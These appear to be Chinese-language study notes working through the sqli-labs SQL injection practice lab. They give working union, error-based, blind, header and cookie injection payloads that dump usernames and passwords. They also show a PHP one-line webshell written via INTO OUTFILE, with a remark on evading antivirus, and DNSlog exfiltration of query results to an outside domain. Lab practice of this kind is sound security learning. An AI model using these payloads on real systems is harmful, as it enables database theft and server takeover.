## 基本流程

目标：获取数据库中所有用户名和密码

1. 查找注入点

2. 判断字符型还是数字型----字符型

3. 字符型：找到闭合方式----可以通过单引号闭合 --+注释

4. group by 或者 order by 判断列数

5. 查询回显位 输入一个不存在的 id 使得无效信息不再显示 id=-1' union select 1,2,3--+ 显示 2, 3 说明回显位是 2，3

6. id=-1' union select 1,2,database() --+ 查看database名称拿到库名 security

7. version() 可以查看版本

8. 拿到表名和列名：information_schema数据库中有 columns：列名集合表 和 tables：表名集合表 两个表，通过 union select 1,2,table_name from information_schema.tables where table_schema='security'（甚至直接写 databases()）

9. 用 group_concat() 来显示所有 table_name：union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'  .  最终拿到表名 users

10. union select 1,version(),group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' 获取列名 **用数据库名和数据表名两个来定位所需要的列名** 得到 id username password

11. 回显 username 和 password：

12. ```sql
    union select 1,version(),group_concat(username,'%%%%%',password) from users
    ```



information_schema.tables 结构：

| 字段             | 含义                                  |
| ---------------- | ------------------------------------- |
| Table_catalog    | 数据表登记目录                        |
| **Table_schema** | 数据表所属的数据库名                  |
| **Table_name**   | 表名称                                |
| Table_type       | 表类型[system view\|base table]       |
| Engine           | 使用的数据库引擎[MyISAM\|CSV\|InnoDB] |
| Version          | 版本，默认值10                        |
| Row_format       | 行格式[Compact\|Dynamic\|Fixed]       |
| Table_rows       | 表里所存多少行数据                    |
| Avg_row_length   | 平均行长度                            |
| Data_length      | 数据长度                              |
| Max_data_length  | 最大数据长度                          |
| Index_length     | 索引长度                              |
| Data_free        | 空间碎片                              |
| Auto_increment   | 做自增主键的自动增量当前值            |
| Create_time      | 表的创建时间                          |
| Update_time      | 表的更新时间                          |
| Check_time       | 表的检查时间                          |
| Table_collation  | 表的字符校验编码集                    |
| Checksum         | 校验和                                |
| Create_options   | 创建选项                              |
| Table_comment    | 表的注释、备注                        |

information_schema.columns 结构：

| 列名                     | 数据类型       | 描述                                                         |
| :----------------------- | :------------- | :----------------------------------------------------------- |
| TABLE_CATALOG            | nvarchar(128)  | 表限定符。                                                   |
| **TABLE_SCHEMA**         | nvarchar(128)  | 表所有者。                                                   |
| **TABLE_NAME**           | nvarchar(128)  | 表名。                                                       |
| **COLUMN_NAME**          | nvarchar(128)  | 列名。                                                       |
| ORDINAL_POSITION         | smallint       | 列标识号。                                                   |
| COLUMN_DEFAULT           | nvarchar(4000) | 列的默认值。                                                 |
| IS_NULLABLE              | varchar(3)     | 列的为空性。如果列允许 NULL，那么该列返回 YES。否则，返回 NO。 |
| DATA_TYPE                | nvarchar(128)  | 系统提供的数据类型。                                         |
| CHARACTER_MAXIMUM_LENGTH | smallint       | 以字符为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 NULL。有关更多信息，请参见数据类型。 |
| CHARACTER_OCTET_LENGTH   | smallint       | 以字节为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 NULL。 |
| NUMERIC_PRECISION        | tinyint        | 近似数字数据、精确数字数据、整型数据或货币数据的精度。否则，返回 NULL。 |
| NUMERIC_PRECISION_RADIX  | smallint       | 近似数字数据、精确数字数据、整型数据或货币数据的精度基数。否则，返回 NULL。 |
| NUMERIC_SCALE            | tinyint        | 近似数字数据、精确数字数据、整数数据或货币数据的小数位数。否则，返回 NULL。 |
| DATETIME_PRECISION       | smallint       | datetime 及 SQL-92 interval 数据类型的子类型代码。对于其它数据类型，返回 NULL。 |
| CHARACTER_SET_CATALOG    | varchar(6)     | 如果列是字符数据或 text 数据类型，那么返回 master，指明字符集所在的数据库。否则，返回 NULL。 |
| CHARACTER_SET_SCHEMA     | varchar(3)     | 如果列是字符数据或 text 数据类型，那么返回 DBO，指明字符集的所有者名称。否则，返回 NULL。 |
| CHARACTER_SET_NAME       | nvarchar(128)  | 如果该列是字符数据或 text 数据类型，那么为字符集返回唯一的名称。否则，返回 NULL。 |
| COLLATION_CATALOG        | varchar(6)     | 如果列是字符数据或 text 数据类型，那么返回 master，指明在其中定义排序次序的数据库。否则此列为 NULL。 |
| COLLATION_SCHEMA         | varchar(3)     | 返回 DBO，为字符数据或 text 数据类型指明排序次序的所有者。否则，返回 NULL。 |
| COLLATION_NAME           | nvarchar(128)  | 如果列是字符数据或 text 数据类型，那么为排序次序返回唯一的名称。否则，返回 NULL。 |
| DOMAIN_CATALOG           | nvarchar(128)  | 如果列是一种用户定义数据类型，那么该列是某个数据库名称，在该数据库名中创建了这种用户定义数据类型。否则，返回 NULL。 |
| DOMAIN_SCHEMA            | nvarchar(128)  | 如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的创建者。否则，返回 NULL。 |
| DOMAIN_NAME              | nvarchar(128)  | 如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的名称。否则，返回 NULL。 |

## 数字型

其他步骤与 less-1 相同，只不过变成了数字型注入

## 括号闭合（1）

1. 先判断是字符型
2. ?id=2' order by 3 --+后报错 check the manual that corresponds to your MySQL server version for the right syntax to use near 'order by 3 -- ') LIMIT 0,1' at line 1 说明要用单引号和括号来闭合
3. 其他步骤相同

## 括号闭合（2）

1. 字符型
2. ?id=2' order by 3--+ 其中 order by 后面数字不管多大都没反应，说明闭合有问题
3. 尝试把单引号改成双引号，出现报错：……use near 'order by 3-- ") LIMIT 0,1' at line 1说明应该用双引号加右括号进行闭合
4. 后续步骤相同

## 报错注入（1）

1. ?id=1' order by 100 --+ 报错 Unknown column '100' in 'order clause' 说明已经正确闭合了

2. ?id=-1'  order by 3--+ 什么都不显示

3. ?id=1'  order by 3--+ 只显示 You are in.........

4. 故意调用不存在的函数套出数据库名：?id=1' union select fuck() --+ 报错 FUNCTION security.fuck does not exist 说明数据库名为 security

5. 利用 extractvalue 报错注入：

6. ```sql
   select extractvalue(1, concat(0x7e, (select database())))
   ```

7. 注意 select database() 必须用括号括起来，才会被当成代码执行。 0x7e 是飘带符号~的代码。

8. 注意这里用 union 连接前面的句子时其实不用考虑列数有没有对齐，报错照样回显

9. 后面的步骤与前面相同

10. 遇到问题：最多默认返回32个字符，利用 substring 函数解决

11. ```sql
    union select 1,2,extractvalue('yemaster', substring(concat(0x7e, (select group_concat(username,'~',password) from users)),4,30))
    ```



利用 extractvalue() 注入：

```sql
select extractvalue('XML_document','Xpath_string') from xml
```

正常查询语句

Xpath_string例子：/book/author/surname

1. 若查询不存在的路径，找不到内容但不报错
2. 将 / 改为 ~ 产生错误 xpath syntax error 后面跟着路径回显，于是通过这处回显进行注入

substring()

```sql
substring(123456,1,3)
```

返回：123

```sql
substring(123456,4,3)
```

返回：456

即下标从1开始，第一个参数表示字符串，然后取从第二个参数给定的下标开始，数第三个参数给定的个数，得到的子串



## 报错注入（2）

相关函数：

1. rand() : 0~1随机小数
2. floor() : 向下取整
3. ceiling()
4. concat_ws() : 将括号内的数据用第一个字段连接起来 concatenate with separator
5. group by 分组语句
6. as 别名
7. count() :  count(column_name) 统计 column_name 中非 NULL 值的行，count(*) 则统计指定表中所有行的数量
8. limit 显示指定行数 limit 0,1 表示限制从第 0 项开始取 1 项



```sql
union select 1,count(*),concat_ws('-',(select database()), floor(rand(0)*2)) as a from information_schema.tables group by a
```

from information_schema.tables 为了有足够的列数

count(*) 用来统计个数

concat_ws() 用 - 将 select database() 的返回值和 floor(rand(0)*2) 的值连接起来

每一个 concat_ws(...) 都重命名为 a 并按照它进行分组，于是会出现两种键

database_name-0 和 database_name-1

该手法成功的关键在于：给它分组时算了一遍 rand , 计数时又要算一遍 rand , 就有可能出现重复定义键名的错误，从而产生报错 duplicate entry，返回我们想要看到的信息

但是，最后一步挂掉了：

```sql
union select 1,count(*),concat_ws('-',(
select group_concat(username,"-",password) from users
), floor(rand(0)*2)) as a from information_schema.tables group by a
```

页面只显示：You are in........    这是怎么回事呢？

太长了，它就不显示了

可以用 substring 解决

也可以用 concat 加上 limit 限制来解决

```sql
union select 1,count(*),concat_ws('-',(
select concat(username,"-",password) from users limit 0,1
), floor(rand(0)*2)) as a from information_schema.tables group by a
```



## 报错注入（3）

其实与 less-5 一样，只是用双引号闭合

在这一题尝试用新方法解决

1. 单引号闭合不报错，双引号闭合报错：use near '"1"" LIMIT 0,1' at line 1说明是用双引号闭合的

2. ```sql
   union select 1,2,updatexml('yemaster', substring(concat(0x7e, (select group_concat(username,'~',password) from users)),4,30),"aaa")
   ```

3. 就是比 extractvalue 多一项无用的参数



利用 updatexml() 报错注入，原理与 extractvalue() 一致

```
select updatexml('XML_document','Xpath_string','New_content') from xml
```

用于更新 xml 文件内容

同样在 xpath 中第一位改为 ~ 用于报错

# 文件注入

1. ```sql
   SHOW VARIABLES LIKE '%secure%'
   ```

2. 查看是否具有文件写入权限：

   | Variable_name            | Value |
   | ------------------------ | ----- |
   | require_secure_transport | OFF   |
   | secure_auth              | ON    |
   | secure_file_priv         | NULL  |

3. 主要关注 secure_file_priv，priv 即 privilege，这是一个用于指定数据库服务器上允许执行LOAD DATA INFILE和LOAD XML语句时的文件路径限制的系统变量。如果设置了这个变量，那么只有在指定路径下的文件才能被加载。当前情况下，它被设置为NULL，这意味着没有明确指定的路径限制，任何地方的文件都**不**可以被加载。测试时需要在 my.ini 中配置 secure_file_priv="" 空，才能使任意地方文件都可以加载。

4. 注入木马

5. ```sql
   select 1,2,'<?php @eval($_POST["abc123"])?>' into outfile "C:\\phpstudy_pro\\WWW\\hackin.php"
   ```

6. Linux 服务器 可能的路径："/var/www/html/test/"

7. 实战时需要考虑绕过木马检测，这种一句话木马很快就会被 windows 自带杀毒软件杀掉

8. 用 antsword 连接，获取服务器控制权



# 布尔盲注

适用于页面只有真值、假值两种情况。手工布尔盲注费时费力。

1. 先判断闭合方式/页面的真假性：and 1=1, and 1=2

2. ```
   ?id=1' and length((select database())) > 9 --+
   ```

3. 通过调整参数得知 select database() 返回值的长度

4. ```
   ?id=1' and ascii((select database())) > 100 --+
   ```

5. 通过调整参数得知 database 的第一个字符的 ascii 码值

6. 利用 substr 选择查看其他位置上的字母（substr() 和 substring() 没有区别，下标从1开始）

7. ```
   ?id=1' and ascii(substr((select database()),2,1)) > 100 --+
   ```

8. 依此类推重复之前题目的方法

# DNSlog 渗透

DNSLog渗透是一种利用DNS（域名系统）协议进行攻击和信息收集的技术。其原理基于DNS协议的特性，即将域名解析为IP地址。攻击者可以创建一个恶意的DNS服务器，当受害者的计算机尝试解析特定的域名时，DNS服务器会记录请求，并将请求信息发送给攻击者，从而实现信息收集。

当我们发送给服务器的代码会执行但缺少回显的时候，dnslog 相当于给了我们一个回显的窗口。我们的目标就是，让目标服务器把我们的代码执行以后的返回值和域名连接起来，对指定域名进行访问从而留下痕迹。

1. 在 www.dnslog.cn 中搞一个域名，比如说这里搞到的是：sy119q.dnslog.cn

2. 构造 sql 语句：

3. ```sql
   select load_file(concat("//",(select database()),".sy119q.dnslog.cn/anyfile.txt"))
   ```

4. 注意：不要漏掉中间的 “.”，也不要忘了再最后加一个文件的名字。看到页面打着转转就知道大概率成功了，因为你的文件名是乱填的，它不可能找得到

5. 点击 dnslog 刷新按钮，即可看到目标服务器的请求



load_file() 既可以读取本机文件（看对方有没有放开这个权限），也可以读取互联网上的文件

似乎只能用于windows服务器上

双斜杠可以改成 4 个反斜杠

双反斜杠代表Microsoft Windows通用命名约定（UNC）的文件和目录路径格式利用任何以下扩展存储程序引发DNS地址解析，4 个反斜杠是因为考虑转义因素

需要打开文件读写权限

# 使用脚本 DnslogSqlinj

```shell
python2 dnslogSql.py -u "http://192.168.216.134/sqli-labs-php7/Less-9/?id=1' and ({})--+" --dbs
python2 dnslogSql.py -u "http://192.168.216.134/sqli-labs-php7/Less-9/?id=1' and ({})--+" -D security --tables
python2 dnslogSql.py -u "http://192.168.216.134/sqli-labs-php7/Less-9/?id=1' and ({})--+" -D security -T users --columns
python2 dnslogSql.py -u "http://192.168.216.134/sqli-labs-php7/Less-9/?id=1' and ({})--+" -D security -T users -C username,password --dump
```



## 时间盲注
啥回显都没有，甚至没有真假值的区别，而网站会执行你写的代码，此时可以使用时间盲注

```sql
select if(ascii(substr((select database()),1,1))>100, sleep(0), sleep(3))
```

其中 if 函数：

```sql
if(condition, True, False)
```

条件式为真时执行 True 语句，条件式为假时执行 False 语句，从而达到判断的效果

# post 注入

1. 用 burp suite 抓包查看提交信息

   <img src="C:\Users\A2140\AppData\Roaming\Typora\typora-user-images\image-20240504155324178.png" alt="image-20240504155324178" style="zoom:67%;" />

2. 看到提交的参数分别是 uname passwd submit

3. 其实 submit 没必要提交，而且由于这个 submit 和 form 中的 submit 重名了，如果提交反而会报错失败

4. 在 hackbar 上进行 post 注入：uname=admin' or 1=1#&passwd=111

5. 如果想获取数据库相关信息，在单引号和 # 之间进行 union 注入即可

# 使用 Burp Suite 进行 Header Injection

1. 首先我们需要争取到一个 username 和 password

2. 看到页面返回了 User Agent : ![image-20240504191737723](C:\Users\A2140\AppData\Roaming\Typora\typora-user-images\image-20240504191737723.png)

3. 查看 php 源码得知注入点就在 $uagent

4. ```php
   $insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
   ```

5. 先用 Burp Suite 拦截，修改 User-Agent 后再向服务器发送请求

6. 利用报错信息得到期望的数据库信息

7. ```
   User-Agent: 1'or updatexml(1,concat('~',(select database())),3),2,3)#
   ```





# 使用 Burp Suite 进行 Header Injection

跟 less-18 几乎一样，只是注入位置从 user-agent 到了 referer

# 使用 Burp Suite 进行 Header Injection

```php
$cookee = $_COOKIE['uname'];
$format = 'D d M Y - H:i:s';
$timestamp = time() + 3600;
echo "<center>";
echo '<br><br><br>';
echo '<img src="../images/Less-20.jpg" />';
echo "<br><br><b>";
echo '<br><font color= "red" font size="4">';	
echo "YOUR USER AGENT IS : ".$_SERVER['HTTP_USER_AGENT'];
echo "</font><br>";	
echo '<font color= "cyan" font size="4">';	
echo "YOUR IP ADDRESS IS : ".$_SERVER['REMOTE_ADDR'];			
echo "</font><br>";			
echo '<font color= "#FFFF00" font size = 4 >';
echo "DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE <br>";
echo '<font color= "orange" font size = 5 >';			
echo "YOUR COOKIE : uname = $cookee and expires: " . date($format, $timestamp);
```



```php
echo "<br></font>";
$sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
$result=mysqli_query($con1, $sql);
if (!$result)
{
    die('Issue with your mysql: ' . mysqli_error($con1));
}
$row = mysqli_fetch_array($result, MYSQLI_BOTH);
```

由代码片段知变量 \$cookee 可以进行注入，而 \$cookee 变量又是从 \$cookee = \$_COOKIE['uname']; 设置的

故先对网页进行拦截，再修改 cookie 值进行报错注入

```
Cookie: uname=admin' or updatexml(1,concat('~',(select database())),3)#
```



